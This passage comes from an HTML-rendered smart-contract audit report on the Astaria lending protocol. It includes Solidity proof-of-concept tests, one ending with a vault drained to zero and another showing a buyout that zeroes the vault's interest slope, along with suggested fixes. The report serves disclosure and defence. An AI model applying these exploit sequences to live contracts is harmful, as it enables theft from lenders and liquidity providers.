class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WETH9</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">50</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// The borrower creates another lien. This time, the borrower is not the owner of the collateral NFT.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// However, it&#39;s still the owner of the CollateralToken.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  (, </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_commitToLien</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vault:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">strategist:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">strategistPK:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOnePK</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tokenContract:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tokenId:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">lienDetails:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blueChipDetails</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">50</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">isFirstLien:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// The borrower has taken a loan of 50 ETH from the vault.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WETH9</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">150</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// The vault was drained.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">WETH9</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider settling the auction at the end of <code>settleLiquidatorNFTClaim</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/ClearingHouse.sol b/src/ClearingHouse.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 5c2a400..d4ee28d 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/ClearingHouse.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/ClearingHouse.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -228,5 +228,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       0,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       s.auctionStack.stack</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 collateralId = _getArgUint256(21);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ASTARIA_ROUTER.COLLATERAL_TOKEN().settleAuction(collateralId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/480\">androolloyd (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-06-buying-out-corrupts-the-slope-of-a-vault-reducing-rewards-of-lps\" style=\"position:relative;\"><a href=\"#h-06-buying-out-corrupts-the-slope-of-a-vault-reducing-rewards-of-lps\" aria-label=\"h 06 buying out corrupts the slope of a vault reducing rewards of lps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/477\">[H-06] Buying out corrupts the slope of a vault, reducing rewards of LPs</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/477\">Jeiwan</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/633\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/366\">obront</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/226\">cccz</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/153\">rvierdiiev</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L189\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L189</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L627-L628\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L627-L628</a></p>\n<p>After a buyout, the slope of a vault won’t be increased. As a result, liquidity providers will lose reward for providing liquidity to borrowers and the borrower will not pay interest for the lien that was bought out.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Buyout is an important refinancing mechanism that allows borrowers to apply new terms (e.g. changed loan rate and/our duration) to their loans. <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L313\">The implementation of the mechanism</a> allows borrower to repay the owed amount for a lien, burn the lien, and create a new lien. When burning and creating liens it’s important to update <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L627-L628\">the slope of a vault</a>: is the total interest accrued by vaults. However, during a buyout the slope of the vault where a new lien is created is not increased:</p>\n<ol>\n<li>after a new lien is created, the slope of the vault is not increased (<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L127\">LienToken.sol#L127</a>);</li>\n<li>however, the slope of the vault is decreased after the old lien is burned (<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L189\">LienToken.sol#L189</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L627-L628\">PublicVault.sol#L627-L628</a>)</li>\n</ol>\n<p>Since, during a buyout, a lien with a different interest rate may be created (due to changed loan terms), the slope of the vault must be updated correctly:</p>\n<ol>\n<li>the slope of the previous lien must be reduced from the total slope of the vault;</li>\n<li>the slope of the new lien must be added to the total slope of the vault.</li>\n</ol>\n<p>If the slope of the new lien is not added to the total slope of the vault, then the lien doesn’t generate interest, which means the borrower doesn’t need to pay interest for taking the loan and liquidity providers won’t be rewarded for providing funds to the borrower.</p>\n<p>The following PoC demonstrates that the slope of a vault is 0 after the only existing lien was bought out:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// src/test/AstariaTest.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testBuyoutLienWrongSlope_AUDIT</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">TestNFT</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nft</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">TestNFT</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">WETH9</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// create a PublicVault with a 14-day epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createPublicVault</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">strategist:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">delegate:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistTwo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">epochLength:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">14</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">label</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;PublicVault&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// lend 50 ether to the PublicVault as address(1)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">_lendToVault</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">Lender</span><span class=\"mtk1\">({</span><span class=\"mtk12\">addr:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amountToLend:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">50</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">}),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">publicVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// borrow 10 eth against the dummy NFT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liens</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ILienToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Stack</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_commitToLien</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vault:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">strategist:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">strategistPK:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOnePK</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tokenContract:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tokenId:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">lienDetails:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">standardLienDetails</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">isFirstLien:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Right after the lien was created the slope of the vault equals to the slope of the lien.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">PublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getSlope</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">LIEN_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">calculateSlope</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">3</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">IAstariaRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Commitment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">refinanceTerms</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_generateValidTerms</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vault:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">strategist:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOne</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">strategistPK:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategistOnePK</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tokenContract:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tokenId:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">lienDetails:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">refinanceLienDetails</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">stack:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  (</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">VaultImplementation</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">buyoutLien</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">refinanceTerms</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// After a buyout the slope of the vault is 0, however it must be equal to the slope of the lien.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Error: a == b not satisfied [uint]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">//  Expected: 481511019363</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">//  Actual: 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk11\">PublicVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publicVault</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getSlope</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">LIEN_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">calculateSlope</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// A lien exists after the buyout, so the slope of the vault cannot be 0.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LIEN_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collId</span><span class=\"mtk1\">), </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hex</span><span class=\"mtk8\">&quot;7c2c35af3fb5f00ff3995cdddd95dcbbad96eea7bca39b305f2d0f8a55d838f8&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider increasing the slope of a public vault after a buyout, similarly to how it’s done <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L449\">after a new commitment</a>.</p>\n<p><strong><a 